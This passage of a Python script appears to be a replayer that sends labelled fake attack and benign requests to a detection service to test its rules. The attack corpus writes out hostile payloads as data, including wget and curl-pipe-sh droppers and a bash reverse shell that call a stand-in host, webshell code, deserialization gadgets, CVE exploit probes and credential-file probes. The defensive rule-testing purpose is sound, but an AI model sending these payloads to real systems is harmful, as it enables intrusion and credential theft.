        "ognl_injection",
        rule="krawl_ognl_injection",
        path="/index.action",
        query="name=%{#_memberAccess['allowStaticMethodAccess']=true}",
    ),
    FakeRequest(
        "spel type expression",
        "el_injection",
        rule="krawl_el_injection",
        path="/search",
        query="q=${T(java.lang.Runtime)}",
    ),
    FakeRequest(
        "php tag with eval in body",
        "php_code_injection",
        rule="krawl_php_code_injection",
        method="POST",
        path="/submit",
        body="data=<?php eval($_POST['x']); ?>",
    ),
    FakeRequest(
        "prototype pollution query",
        "prototype_pollution",
        rule="krawl_prototype_pollution",
        path="/api/merge",
        query="__proto__[admin]=true",
    ),
    FakeRequest(
        "prototype pollution json",
        "prototype_pollution",
        rule="krawl_prototype_pollution",
        method="POST",
        path="/api/merge",
        body='{"__proto__":{"admin":true}}',
    ),
    FakeRequest(
        "dropper cd tmp wget",
        "download_execute",
        rule="krawl_download_execute",
        path="/ping",
        query="host=1.1.1.1;cd /tmp;wget http://203.0.113.5/a.sh;sh a.sh",
    ),
    FakeRequest(
        "dropper curl pipe sh",
        "download_execute",
        rule="krawl_download_execute",
        method="POST",
        path="/api/run",
        body="cmd=curl http://203.0.113.5/a.sh | sh",
    ),
    FakeRequest(
        "bash reverse shell",
        "reverse_shell",
        rule="krawl_reverse_shell",
        path="/run",
        query="x=bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
    ),
    FakeRequest(
        "ssi exec directive",
        "ssi_injection",
        rule="krawl_ssi_injection",
        path="/page",
        query='name=<!--#exec cmd="id"-->',
    ),
    FakeRequest(
        "overlong utf8 traversal",
        "path_traversal",
        rule="krawl_path_traversal_evasion",
        path="/download",
        query="file=..%c0%af..%c0%afetc/hosts",
    ),
    FakeRequest(
        "semicolon dot-dot traversal",
        "path_traversal",
        rule="krawl_path_traversal_evasion",
        path="/static/..;/WEB-INF/web.xml",
    ),
    # --- Deserialization ---
    FakeRequest(
        "java serialized cookie",
        "java_deserialization",
        rule="krawl_deser_java",
        path="/",
        headers={"Cookie": "session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"},
    ),
    FakeRequest(
        "fastjson type hint",
        "json_deserialization",
        rule="krawl_deser_json",
        method="POST",
        path="/api/parse",
        body='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.5/a","autoCommit":true}',
    ),
    FakeRequest(
        "php serialized object",
        "php_deserialization",
        rule="krawl_deser_php",
        path="/index.php",
        query='data=O:8:"stdClass":1:{s:1:"a";s:1:"b";}',
    ),
    FakeRequest(
        "dotnet binaryformatter viewstate",
        "dotnet_deserialization",
        rule="krawl_deser_dotnet",
        method="POST",
        path="/default.aspx",
        body="__VIEWSTATE=AAEAAAD/////AQAAAAAAAAAEAQAAAH5TeXN0ZW0=",
    ),
    FakeRequest(
        "python pickle os.system",
        "python_pickle",
        rule="krawl_deser_python_pickle",
        method="POST",
        path="/load",
        body="data=cos%0Asystem%0A(S'id'%0Atp1%0ARp2%0A.",
    ),
    # --- Webshells ---
    FakeRequest(
        "known webshell filename",
        "webshell_probe",
        rule="krawl_webshell_path",
        path="/c99.php",
    ),
    FakeRequest(
        "script in uploads directory",
        "webshell_probe",
        rule="krawl_webshell_path",
        path="/wp-content/uploads/2024/cache.php",
    ),
    FakeRequest(
        "put php script",
        "webshell_upload",
        rule="krawl_webshell_upload",
        method="PUT",
        path="/dav/shell.php",
    ),
    # --- Exposure probes and scanner identities ---
    # Seen on the demo and missed by the first YARA release.
    FakeRequest(
        ".env editor backup",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/.env~",
    ),
    FakeRequest(
        ".env numbered copy",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/.env1",
    ),
    FakeRequest(
        ".env underscore variant",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/.env_local",
    ),
    FakeRequest(
        "direnv file",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/.envrc",
    ),
    FakeRequest(
        "named env file",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/aws.env",
    ),
    FakeRequest(
        "git user config",
        "vcs_ide_probe",
        rule="krawl_probe_vcs_ide",
        path="/.gitconfig",
    ),
    FakeRequest(
        "github actions workflow",
        "vcs_ide_probe",
        rule="krawl_probe_vcs_ide",
        path="/.github/workflows/deploy.yml",
    ),
    FakeRequest(
        "plain password list",
        "credential_file_probe",
        rule="krawl_probe_password_lists",
        path="/passwords.txt",
    ),
    FakeRequest(
        "wordpress users rest api",
        "wp_user_enum",
        rule="krawl_probe_wordpress_users",
        path="/wp-json/wp/v2/users/me",
    ),
    FakeRequest(
        "wordpress users through rest_route",
        "wp_user_enum",
        rule="krawl_probe_wordpress_users",
        path="/",
        query="rest_route=/wp/v2/users",
    ),
    FakeRequest(
        "wordpress author id scan",
        "wp_user_enum",
        rule="krawl_probe_wordpress_users",
        path="/",
        query="author=1",
    ),
    FakeRequest(
        "wordpress batch api under a prefix",
        "cve_2026_63030",
        rule="krawl_cve_2026_63030_wordpress",
        method="POST",
        path="/blog/wp-json/batch/v1",
        body='{"requests":[]}',
    ),
    FakeRequest(
        "gitlab workhorse file.path upload field",
        "cve_2026_85706",
        rule="krawl_cve_2026_85706_gitlab",
        method="POST",
        path="/api/v4/projects/2/repository/commits/",
        body="file=&file.path=/proc/self/environ&file.size=1",
    ),
    FakeRequest(
        "dotted named env file",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/.sendgrid.env",
    ),
    FakeRequest(
        "password list with a trailing slash",
        "credential_file_probe",
        rule="krawl_probe_password_lists",
        path="/passwords.txt/",
    ),
    FakeRequest(
        "gcp service account key",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/gcp-credentials.json",
    ),
    FakeRequest(
        "firebase admin sdk key",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/firebase-adminsdk.json",
    ),
    FakeRequest(
        "gcloud application default credentials",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.config/gcloud/application_default_credentials.json",
    ),
    FakeRequest(
        "wpgraphql user enumeration",
        "wp_user_enum",
        rule="krawl_probe_wordpress_users",
        method="POST",
        path="/graphql",
        body='{"query":"query { users(first:100) { nodes { slug } } }"}',
    ),
    FakeRequest(
        "agent tool reading .env",
        "path_traversal",
        rule="krawl_path_traversal",
        method="POST",
        path="/read-document",
        body='{"file_path":".env"}',
    ),
    FakeRequest(
        "agent tool running env",
        "command_injection",
        rule="krawl_command_injection",
        method="POST",
        path="/api/fs/exec",
        body='{"command":"env","args":[]}',
    ),
    FakeRequest(
        "base64 python import os",
        "command_injection",
        rule="krawl_command_injection",
        method="POST",
        path="/exec-py",
        body="code=aW1wb3J0IG9zOyBvcy5wb3BlbignaWQnKQ==",
    ),
    FakeRequest(
        "double-encoded traversal in a form",
        "path_traversal",
        rule="krawl_path_traversal_evasion",
        method="POST",
        path="/",
        body="page_id=1&pagename=templates%252F%252E%252E%252F%252E%252E%252Fwp-config",
    ),
    FakeRequest(
        "react2shell with unicode-escaped keys",
        "cve_2025_55182",
        rule="krawl_cve_2025_55182_react2shell",
        method="POST",
        path="/",
        body='{"\\u0074\\u0068\\u0065\\u006e":"\\u0024\\u0031\\u003a'
        "\\u005f\\u005f\\u0070\\u0072\\u006f\\u0074\\u006f\\u005f\\u005f"
        '\\u003a\\u0074\\u0068\\u0065\\u006e"}',
    ),
    FakeRequest(
        "react2shell scanner probe",
        "cve_2025_55182",
        rule="krawl_cve_2025_55182_react2shell",
        method="POST",
        path="/",
        headers={"next-action": "x"},
        body='------b\r\nContent-Disposition: form-data; name="1"\r\n\r\n{}\r\n'
        '------b\r\nContent-Disposition: form-data; name="0"\r\n\r\n["$1:aa:aa"]\r\n------b--',
    ),
    FakeRequest(
        "aws credentials probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.aws/credentials",
    ),
    FakeRequest(
        "ssh private key probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.ssh/id_rsa",
    ),
    FakeRequest(
        "ssh public key probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.ssh/id_ed25519.pub",
    ),
    FakeRequest(
        "docker config probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.docker/config.json",
    ),
    FakeRequest(
        "kube config probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.kube/config",
    ),
    FakeRequest(
        "npmrc probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.npmrc",
    ),
    FakeRequest(
        "pypirc probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.pypirc",
    ),
    FakeRequest(
        "netrc probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.netrc",
    ),
    FakeRequest(
        "git credentials probe",
        "credential_file_probe",
        rule="krawl_probe_credential_files",
        path="/.git-credentials",
    ),
    FakeRequest(
        "wp-config backup probe",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/wp-config.php.bak",
    ),
    FakeRequest(
        "env production probe",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/.env.production",
    ),
    FakeRequest(
        "appsettings probe",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/appsettings.json",
    ),
    FakeRequest(
        "docker-compose probe",
        "config_file_probe",
        rule="krawl_probe_config_files",
        path="/docker-compose.yml",
    ),
    FakeRequest(
        "backup archive probe",
        "backup_archive_probe",
        rule="krawl_probe_backup_archives",
        path="/backup.zip",
    ),
    FakeRequest(
        "database dump probe",
        "backup_archive_probe",
        rule="krawl_probe_backup_archives",
        path="/db.sql.gz",
    ),
    FakeRequest(
        "svn entries probe",
        "vcs_ide_probe",
        rule="krawl_probe_vcs_ide",
        path="/.svn/entries",
    ),
    FakeRequest(
        "vscode sftp probe",
        "vcs_ide_probe",
        rule="krawl_probe_vcs_ide",
        path="/.vscode/sftp.json",
    ),
    FakeRequest(
        "idea workspace probe",
        "vcs_ide_probe",
        rule="krawl_probe_vcs_ide",
        path="/.idea/workspace.xml",
    ),
    FakeRequest(
        "actuator env probe",
        "actuator_probe",
        rule="krawl_probe_spring_actuator",
        path="/actuator/env",
    ),
    FakeRequest(
        "heapdump probe",
        "actuator_probe",
        rule="krawl_probe_spring_actuator",
        path="/heapdump",
    ),
    FakeRequest(
        "phpinfo probe",
        "phpinfo_probe",
        rule="krawl_probe_phpinfo",
        path="/phpinfo.php",
    ),
    FakeRequest(
        "info.php probe", "phpinfo_probe", rule="krawl_probe_phpinfo", path="/info.php"
    ),
    FakeRequest(
        "server-status probe",
        "server_status_probe",
        rule="krawl_probe_server_status",
        path="/server-status",
    ),
    FakeRequest(
        "nginx_status probe",
        "server_status_probe",
        rule="krawl_probe_server_status",
        path="/nginx_status",
    ),
    FakeRequest(
        "tomcat manager probe",
        "admin_console_probe",
        rule="krawl_probe_admin_console",
        path="/manager/html",
    ),
    FakeRequest(
        "jenkins script console probe",
        "admin_console_probe",
        rule="krawl_probe_admin_console",
        path="/scriptText",
    ),
    FakeRequest(
        "werkzeug console probe",
        "admin_console_probe",
        rule="krawl_probe_admin_console",
        path="/console",
    ),
    FakeRequest(
        "graphql introspection",
        "graphql_introspection",
        rule="krawl_graphql_introspection",
        method="POST",
        path="/graphql",
        body='{"query":"query IntrospectionQuery { __schema { types { name } } }"}',
    ),
    FakeRequest(
        "web-inf web.xml probe",
        "web_inf_probe",
        rule="krawl_probe_web_inf",
        path="/app/WEB-INF/web.xml",
    ),
    FakeRequest(
        "docker containers json probe",
        "container_api_probe",
        rule="krawl_probe_container_api",
        path="/containers/json",
    ),
    FakeRequest(
        "kubernetes pods probe",
        "container_api_probe",
        rule="krawl_probe_container_api",
        path="/api/v1/pods",
    ),
    FakeRequest(
        "elasticsearch cat indices probe",
        "elasticsearch_probe",
        rule="krawl_probe_elasticsearch",
        path="/_cat/indices",
    ),
    FakeRequest(
        "elasticsearch search probe",
        "elasticsearch_probe",
        rule="krawl_probe_elasticsearch",
        path="/_search",
        query="q=*",
    ),
    FakeRequest(
        "hadoop yarn new-application",
        "hadoop_yarn_rce",
        rule="krawl_probe_hadoop_yarn",
        method="POST",
        path="/ws/v1/cluster/apps/new-application",
    ),
    FakeRequest(
        "dirsearch user agent",
        "offensive_tool_ua",
        rule="krawl_ua_offensive_tool",
        path="/",
        user_agent="dirsearch/0.4.3",
    ),
    FakeRequest(
        "joomscan user agent",
        "offensive_tool_ua",
        rule="krawl_ua_offensive_tool",
        path="/",
        user_agent="Mozilla/5.0 joomscan",
    ),
    FakeRequest(
        "censys user agent",
        "research_scanner_ua",
        rule="krawl_ua_research_scanner",
        path="/",
        user_agent="Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
    ),
    FakeRequest(
        "leakix user agent",
        "research_scanner_ua",
        rule="krawl_ua_research_scanner",
        path="/",
        user_agent="l9explore/1.2.2",
    ),
    # --- Added for the next release ---
    FakeRequest(
        "check point file read",
        "cve_2024_24919",
        rule="krawl_cve_2024_24919_checkpoint_file_read",
        method="POST",
        path="/clients/MyCRL",
        body="aCSHELL/../../../../../../../etc/shadow",
    ),
    FakeRequest(
        "screenconnect setup wizard bypass",
        "cve_2024_1709",
        rule="krawl_cve_2024_1709_screenconnect_setup_wizard",
        path="/SetupWizard.aspx/x",
    ),
    FakeRequest(
        "serv-u internal dir traversal",
        "cve_2024_28995",
        rule="krawl_cve_2024_28995_servu_traversal",
        path="/",
        query="InternalDir=/../../../../windows&InternalFile=win.ini",
    ),
    FakeRequest(
        "rejetto hfs exec macro",
        "cve_2024_23692",
        rule="krawl_cve_2024_23692_rejetto_hfs_template",
        path="/",
        query="n=%0A&search=%25xxx%25url%25:%25password%25}{.exec|whoami.}",
    ),
    FakeRequest(
        "crushftp include tag",
        "cve_2024_4040",
        rule="krawl_cve_2024_4040_crushftp_template",
        path="/WebInterface/function/",
        query="command=exists&paths=<INCLUDE>/etc/passwd</INCLUDE>",
    ),
    FakeRequest(
        "cyberpanel statusfile injection",
        "cve_2024_51567",
        rule="krawl_cve_2024_51567_cyberpanel_upgrademysqlstatus",
        method="POST",
        path="/dataBases/upgrademysqlstatus",
        body='{"statusfile": "/dev/null; id; #", "csrftoken": "x"}',
        headers={"Content-Type": "application/json"},
    ),
    FakeRequest(
        "pan-os auth check header",
        "cve_2024_0012",
        rule="krawl_cve_2024_0012_panos_auth_bypass",
        path="/php/utils/createRemoteAppwebSession.php/x.js.map",
        headers={"X-PAN-AUTHCHECK": "off"},
    ),
    FakeRequest(
        "pan-os ztp gate",
        "cve_2024_0012",
        rule="krawl_cve_2024_0012_panos_auth_bypass",
        path="/php/ztp_gate.php/.js.map",
    ),
    FakeRequest(
        "splunk windows traversal",
        "cve_2024_36991",
        rule="krawl_cve_2024_36991_splunk_windows_traversal",
        path="/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd",
    ),
    FakeRequest(
        "tomcat partial put session",
        "cve_2025_24813",
        rule="krawl_cve_2025_24813_tomcat_partial_put",
        method="PUT",
        path="/x.session",
        body="serialized-session-placeholder",
        headers={"Content-Range": "bytes 0-5/100"},
    ),
    FakeRequest(
        "langflow validate code",
        "cve_2025_3248",
        rule="krawl_cve_2025_3248_langflow_validate_code",
        method="POST",
        path="/api/v1/validate/code",
        body='{"code": "def f():\\n    pass"}',
        headers={"Content-Type": "application/json"},
    ),
    FakeRequest(
        "d-link nas messagebus",
        "cve_2024_3273",
        rule="krawl_cve_2024_3273_dlink_nas_sharing",
        path="/cgi-bin/nas_sharing.cgi",
        query="user=messagebus&passwd=&cmd=15&system=aWQ=",
    ),
    FakeRequest(
        "avtech brightness injection",
        "cve_2024_7029",
        rule="krawl_cve_2024_7029_avtech_brightness",
        method="POST",
        path="/cgi-bin/supervisor/Factory.cgi",
        body="action=white_led&brightness=$(id)",
    ),
    FakeRequest(
        "bricks render element",
        "cve_2024_25600",
        rule="krawl_cve_2024_25600_wp_bricks_render_element",
        method="POST",
        path="/wp-json/bricks/v1/render_element",
        body='{"postId": "1", "nonce": "x", "element": {"name": "container"}}',
        headers={"Content-Type": "application/json"},
    ),
    FakeRequest(
        "kaswara font icon upload",
        "cve_2021_24284",
        rule="krawl_cve_2021_24284_wp_kaswara_upload",
        method="POST",
        path="/wp-admin/admin-ajax.php",
        query="action=uploadFontIcon",
    ),
    FakeRequest(
        "protocol-relative next",
        "open_redirect",
        rule="krawl_open_redirect",
        path="/login",
        query=f"next=//{CALLBACK}/account",
    ),
    FakeRequest(
        "backslash redirect uri",
        "open_redirect",
        rule="krawl_open_redirect",
        path="/oauth/callback",
        query=f"redirect_uri=/%5C{CALLBACK}",
    ),
    FakeRequest(
        "jwt with alg none",
        "jwt_none_alg",
        rule="krawl_jwt_none_algorithm",
        path="/api/me",
        headers={
            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
        },
    ),
    FakeRequest(
        "springdoc api docs",
        "api_docs_probe",
        rule="krawl_probe_api_docs",
        path="/v3/api-docs",
    ),
    FakeRequest(
        "swagger ui page",
        "api_docs_probe",
        rule="krawl_probe_api_docs",
        path="/swagger-ui/index.html",
    ),
    FakeRequest(
        "go pprof heap",
        "debug_endpoint_probe",
        rule="krawl_probe_debug_endpoints",
        path="/debug/pprof/heap",
    ),
    FakeRequest(
        "symfony profiler",
        "debug_endpoint_probe",
        rule="krawl_probe_debug_endpoints",
        path="/_profiler/latest",
    ),
    FakeRequest(
        "git config",
        "vcs_ide_probe",
        rule="krawl_probe_vcs_ide",
        path="/.git/config",
    ),
    FakeRequest(
        "shellshock reading passwd",
        "shellshock",
        rule="krawl_shellshock",
        path="/cgi-bin/test.cgi",
        user_agent="() { :; }; echo; /bin/cat /etc/passwd",
    ),
]

BENIGN = [
    FakeRequest(
        "normal cookie and headers",
        path="/account",
        headers={
            "Cookie": "session=abc123; id=5; cmd=ls; theme=dark",
            "Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
            "Referer": "https://example.com/search?q=union+of+states&page=2",
        },
    ),
    FakeRequest("search", path="/search", query="q=hello+world&page=2"),
    FakeRequest("gitlab api project list", path="/api/v4/projects"),
    FakeRequest(
        "json form with a file name",
        method="POST",
        path="/upload",
        body='{"file_path":"reports/2026-q3.pdf","command":"save"}',
    ),
    FakeRequest("download of a key file", path="/downloads/key.json"),
    FakeRequest("author archive page", path="/author/jane/"),
    FakeRequest(
        "form with a content type field",
        method="POST",
        path="/contact",
        body="name=Jane&Content-Type=application%2Fx-www-form-urlencoded",
    ),
    FakeRequest(
        "next.js server action call",
        method="POST",
        path="/checkout",
        headers={"next-action": "7f3a9c", "Content-Type": "text/plain;charset=UTF-8"},
        body='[{"cartId":"$K1","items":"$@2"},"$undefined"]',
    ),
    FakeRequest("host parameter", path="/status", query="host=example.com"),
    FakeRequest("external link", path="/out", query="url=https://example.com/post"),
    FakeRequest(
        "contact form",
        method="POST",
        path="/contact",
        body="name=Ann&email=ann%40example.com&msg=I+use+curl+and+wget+daily",
    ),
    FakeRequest(
        "json order",
        method="POST",
        path="/api/orders",
        body='{"item": "book", "price": {"currency": "EUR", "amount": 12}}',
        headers={"Content-Type": "application/json"},
    ),
    FakeRequest(
        "template docs",
        method="POST",
        path="/comments",
        body="msg=Use+{{ name }}+in+your+template",
    ),
    FakeRequest(
        "browser",
        path="/blog/2026/10/hello",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0",
    ),
    FakeRequest(
        "googlebot",
        path="/",
        user_agent="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    ),
    # --- Near misses for the exploit and exposure rules ---
    FakeRequest(
        "confluence page view", path="/pages/viewpage.action", query="pageId=12345"
    ),
    FakeRequest("setup page without bypass flag", path="/setup/welcome"),
    FakeRequest("rest users listing", path="/app/rest/users", query="locator=count:10"),
    FakeRequest("jsp query without bypass suffix", path="/home", query="jsp=header"),
    FakeRequest("autodiscover xml", path="/autodiscover/autodiscover.xml"),
    FakeRequest("vpn login page", path="/remote/login", query="lang=en"),
    FakeRequest("api license status", path="/api/v1/license/status"),
    FakeRequest("grafana plugin asset", path="/public/plugins/loader.js"),
    FakeRequest("plain cgi script", path="/cgi-bin/hello.cgi"),
    FakeRequest(
        "multipart content type",
        method="POST",
        path="/upload",
        headers={"Content-Type": "multipart/form-data; boundary=----x"},
    ),
    FakeRequest(
        "short remember me cookie",
        path="/",
        headers={"Cookie": "rememberMe=1; theme=dark"},
    ),
    FakeRequest(
        "forwarded header",
        path="/",
        headers={
            "Forwarded": "for=198.51.100.7;proto=https",
            "X-Forwarded-For": "198.51.100.7",
        },
    ),
    FakeRequest(
        "opaque session cookie", path="/", headers={"Cookie": "SESSID=abc123def456"}
    ),
    FakeRequest(
        "json accept header",
        path="/api/items",
        headers={"Accept": "application/json, text/plain, */*"},
    ),
    FakeRequest(
        "hnap normal soapaction",
        path="/HNAP1/",
        headers={"SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings"'},
    ),
    FakeRequest("wp plugin readme", path="/wp-content/plugins/akismet/readme.txt"),
    FakeRequest("wp post permalink", path="/", query="p=123"),
    FakeRequest("joomla articles api", path="/api/index.php/v1/content/articles"),
    FakeRequest("composer autoload", path="/vendor/autoload.php"),
    FakeRequest(
        "shop product query",
        path="/index.php",
        query="route=product/product&product_id=3",
    ),
    FakeRequest("signup page view", path="/user/register"),
    FakeRequest(
        "question about reverse shells",
        path="/search",
        query="q=what+is+a+reverse+shell",
    ),
    FakeRequest(
        "question about wget", path="/search", query="q=wget+tutorial+for+beginners"
    ),
    FakeRequest(
        "comment mentioning curl",
        method="POST",
        path="/comments",
        body="text=curl is great for testing apis",
    ),
    FakeRequest(
        "comment mentioning chmod",
        method="POST",
        path="/comments",
        body="text=run chmod +x script.sh first",
    ),
    FakeRequest(
        "json body with type key",
        method="POST",
        path="/api/items",
        body='{"type":"user","name":"x"}',
    ),
    FakeRequest("opaque base64 token", path="/verify", query="token=Zm9vYmFyYmF6cXV4"),
    FakeRequest("template placeholder", path="/render", query="tpl=${name}"),
    FakeRequest("tilde and double dots in a title", path="/blog/a..b-notes"),
    FakeRequest(
        "proto word in query", path="/search", query="q=prototype+design+patterns"
    ),
    FakeRequest("colon text in query", path="/search", query="q=O:+hello"),
    FakeRequest("uploaded image", path="/wp-content/uploads/2024/photo.jpg"),
    FakeRequest("static javascript", path="/images/app.js"),
    FakeRequest(
        "normal graphql query",
        method="POST",
        path="/graphql",
        body='{"query":"{ user(id: 1) { name } }"}',
    ),
    FakeRequest("hash fragment style path", path="/manager/profile"),
    FakeRequest("server status page of a blog", path="/server-status-page"),
    FakeRequest("next static asset", path="/_next/static/chunks/main.js"),
    FakeRequest("well known security txt", path="/.well-known/security.txt"),
    FakeRequest("search endpoint", path="/search", query="q=laptops"),
    FakeRequest("info page", path="/info.html"),
    FakeRequest("health check", path="/actuator/health"),
    FakeRequest("curl user agent", path="/", user_agent="curl/8.5.0"),
    FakeRequest(
        "python requests user agent", path="/", user_agent="python-requests/2.31.0"
    ),
    FakeRequest(
        "bing crawler",
        path="/",
        user_agent="Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    ),
    FakeRequest("put of an image", method="PUT", path="/dav/photo.png"),
    FakeRequest("setup wizard without trailing segment", path="/SetupWizard.aspx"),
    FakeRequest(
        "relative next parameter", path="/login", query="next=/account/settings"
    ),
    FakeRequest(
        "absolute return url", path="/logout", query="returnTo=https://example.com/home"
    ),
    FakeRequest("api design blog post", path="/blog/openapi-best-practices"),
    FakeRequest("debugging blog post", path="/blog/debugging-go-services"),
    FakeRequest(
        "signed bearer token",
        path="/api/me",
        headers={
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.c2ln"
        },
    ),
    FakeRequest("download of a session file", path="/docs/user.session"),
    FakeRequest("splunk messaging inbox", path="/en-US/modules/messaging/inbox"),
    FakeRequest("brightness setting", path="/settings", query="brightness=70"),
    # Seen on the demo, matched by baseline rules before they were tightened.
    FakeRequest("javamelody-like monitoring page", path="/monitoring"),
    FakeRequest("upload in a userfiles folder", path="/userfiles/xmas.jpg"),
    FakeRequest("workspace page", path="/workspace/"),
]

# Baseline rules mined from nuclei-templates (rules/cve_<year>.yar,
# vulnerabilities.yar, exposures.yar): one request carrying each rule's indicator.
BASELINE_FILE = Path(__file__).with_name("fake_attacks_baseline.json")
ATTACKS += [
    FakeRequest(**item) for item in json.loads(BASELINE_FILE.read_text("utf-8"))
]


def select_corpus(only: str | None = None, benign: bool = False) -> list[FakeRequest]:
    """ATTACKS filtered by attack_type or rule name, optionally plus BENIGN."""
    corpus = [item for item in ATTACKS if not only or only in {item.expect, item.rule}]
    return corpus + BENIGN if benign else corpus


def build_url(base: str, item: FakeRequest) -> str:
    # Keep existing %XX escapes; encode the characters a client would.
    path = urllib.parse.quote(item.path, safe="/%")
    url = base.rstrip("/") + path
    if item.query:
        url += "?" + urllib.parse.quote(item.query, safe="=&+%")
    return url


def send(
    base: str, item: FakeRequest, timeout: float, source_ip: str = ""
) -> tuple[int, str]:
    headers = {"User-Agent": item.user_agent, **item.headers}
    if source_ip:
        headers["X-Forwarded-For"] = source_ip
    data = item.body.encode() if item.method == "POST" else None
    if data is not None:
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    # main() only accepts http(s) base URLs, which is what S310 guards against.
    request = urllib.request.Request(  # noqa: S310
        build_url(base, item), data=data, headers=headers, method=item.method
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:  # noqa: S310
            return response.status, response.read(120).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(120).decode("utf-8", "replace")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[1])
    parser.add_argument("--url", default="http://localhost:5000")
    parser.add_argument("--only", help="replay only this attack_type or rule name")
    parser.add_argument("--benign", action="store_true", help="also send BENIGN")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--source-ip",
        default="198.51.100.66",
        help="X-Forwarded-For value; empty string to send none",
    )
    args = parser.parse_args(argv)
    if urllib.parse.urlsplit(args.url).scheme not in {"http", "https"}:
        parser.error("--url must be an http:// or https:// URL")

    corpus = select_corpus(args.only, args.benign)
    if not corpus:
        print(f"No fake attacks for {args.only!r}", file=sys.stderr)
        return 1

    failures = 0
    for item in corpus:
        try:
            status, snippet = send(args.url, item, args.timeout, args.source_ip)
        except (OSError, urllib.error.URLError) as exc:
            failures += 1
            print(f"ERR  {item.expect or 'benign':20} {item.name}: {exc}")
            continue
        preview = snippet.replace("\n", " ")[:60]
        print(f"{status:<4} {item.expect or 'benign':20} {item.name:28} {preview}")
    print(f"\nSent {len(corpus) - failures}/{len(corpus)}; check the dashboard.")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
